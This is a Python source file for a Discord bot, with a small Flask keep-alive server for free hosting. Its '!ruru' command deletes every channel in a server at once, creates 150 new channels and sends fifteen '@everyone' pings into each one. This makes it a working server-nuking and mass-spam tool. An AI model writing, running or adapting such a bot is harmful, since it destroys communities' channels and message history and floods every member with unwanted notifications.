import os
import threading
import asyncio
from flask import Flask
import discord
from discord.ext import commands

# --- KeepAlive Server for Render & UptimeRobot ---
app = Flask(__name__)

@app.route("/")
def home():
    """UptimeRobotヘルスチェック応答"""
    return "Bot is running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting Flask server on port {port}...")
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    threading.Thread(target=run_flask).start()
    print("Keep-alive server started.")

# --- Discord Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")

# --- 高速削除・生成・メッセージ送信コマンド ---
@bot.command()
@commands.has_permissions(administrator=True)
async def ruru(ctx):
    # 並行で全チャンネル削除
    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 150個のチャンネル名
    channel_names = [f"ch-{i:03}" for i in range(1, 151)]
    
    # 並行で全チャンネル生成
    create_tasks = [ctx.guild.create_text_channel(name) for name in channel_names]
    created_channels = await asyncio.gather(*create_tasks)

    # 各チャンネルに15回メッセージ送信（非同期）
    message_tasks = []
    for ch in created_channels:
        for _ in range(15):
            message_tasks.append(ch.send("@everyone るる最強"))
    await asyncio.gather(*message_tasks)

    await ctx.send("150個のチャンネルを生成し、各チャンネルに15個メッセージ送信しました！")

# --- Main Execution ---
if __name__ == "__main__":
    TOKEN = os.environ.get("DISCORD_TOKEN")
    if not TOKEN:
        print("エラー: 環境変数 'DISCORD_TOKEN' が設定されていません。")
    else:
        keep_alive()
        bot.run(TOKEN)
